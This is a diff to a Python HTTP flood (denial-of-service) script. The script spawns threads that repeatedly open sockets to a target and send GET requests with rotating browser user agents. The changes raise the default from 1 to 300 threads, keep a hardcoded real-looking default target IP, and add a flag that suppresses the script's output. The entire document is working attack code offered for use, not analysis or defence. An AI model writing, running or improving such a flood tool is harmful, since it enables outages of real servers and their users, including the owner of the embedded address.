@@ -11,7 +11,7 @@ import sys
 import threading
 import time
 
-THREAD_DEFAULT = 1
+THREAD_DEFAULT = 300
 TARGET_DEFAULT = "47.94.138.231"
 PORT_DEFAULT = 80
 
@@ -34,8 +34,9 @@ def print_help():
     print("  -H or --host\tIP address of the server.")
     print("  -P or --port\tPort of the server.")
     print("  -T or --thread\tMultithread.")
+    print("  -V or --verbose\tVerbose mode")
     print("Example:")
-    print("  python3 %s -H TARGET_IP -P TARGET_PORT -T N_THREAD"
+    print("  python3 %s -H TARGET_IP -P TARGET_PORT -T N_THREAD -V IF_VERBOSE"
           % (sys.argv[0]))
     print()
 
@@ -49,7 +50,8 @@ def getopt(ARGS):
             exit(0)
     ret = {"host": TARGET_DEFAULT,
            "port": PORT_DEFAULT,
-           "thread": THREAD_DEFAULT}
+           "thread": THREAD_DEFAULT,
+           "verbose": True}
     for i in range(1, len(ARGS)):
         if i % 2 == 1:
             if ARGS[i] in ['-H', '--host']:
@@ -58,6 +60,11 @@ def getopt(ARGS):
                 ret['port'] = int(ARGS[i + 1])
             elif ARGS[i] in ['-T', '--thread']:
                 ret['thread'] = int(ARGS[i + 1])
+            elif ARGS[i] in ['-V', '--verbose']:
+                if ARGS[i + 1] == 'y':
+                    ret['verbose'] = True
+                else:
+                    ret['verbose'] = False
             else:
                 try:
                     assert False
@@ -98,10 +105,11 @@ class sendGET(threading.Thread):
         "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
     ]
 
-    def __init__(self, target, port):
+    def __init__(self, target, port, verbose=False):
         try:
             self.__target = target
             self.__port = port
+            self.__verbose = verbose
             dice = random.randint(0,9)
             if dice == 0:
                 self.__type = 0
@@ -110,19 +118,22 @@ class sendGET(threading.Thread):
             sendGET.THREAD += 1
             threading.Thread.__init__(self)
         except KeyboardInterrupt:
-            print("\nHTTP flood attack ends!")
+            if self.__verbose:
+                print("\nHTTP flood attack ends!")
             exit(0)
 
     def __del__(self):
         try:
             sendGET.THREAD -= 1
         except KeyboardInterrupt:
-            print("\nHTTP flood attack ends!")
+            if self.__verbose:
+                print("\nHTTP flood attack ends!")
             exit(0)
 
     def run(self):
         try:
-            print ("\r%d threads running" % sendGET.THREAD, end="")
+            if self.__verbose:
+                print ("\r%d threads running" % sendGET.THREAD, end="")
             if self.__type == 0 or len(sendGET.file_pool) == 0:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.connect((self.__target, self.__port))
@@ -145,7 +156,8 @@ class sendGET(threading.Thread):
                 sock.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
             return
         except KeyboardInterrupt:
-            print("\nHTTP flood attack ends!")
+            if self.__verbose:
+                print("\nHTTP flood attack ends!")
             exit(0)
         except socket.error:
             pass
@@ -170,17 +182,18 @@ if __name__ == "__main__":
     print("HTTP flood attack will begin in")
     countdown = 5
     for i in range(countdown, 0, -1):
-        tmp_str = '\r'
-        for j in range(countdown, i - 1, -1):
-            tmp_str += str(j) + "..."
-        print(tmp_str, end="")
+        if args['verbose'] == True:
+            tmp_str = '\r'
+            for j in range(countdown, i - 1, -1):
+                tmp_str += str(j) + "..."
+            print(tmp_str, end="")
         time.sleep(1)
     print("\nHTTP flood attack begins!")
 
     while True:
         try:
             if sendGET.THREAD <= args['thread']:
-                tmp = sendGET(args['host'], args['port'])
+                tmp = sendGET(args['host'], args['port'], args['verbose'])
                 tmp.start()
         except KeyboardInterrupt:
             print("\nHTTP flood attack ends!")
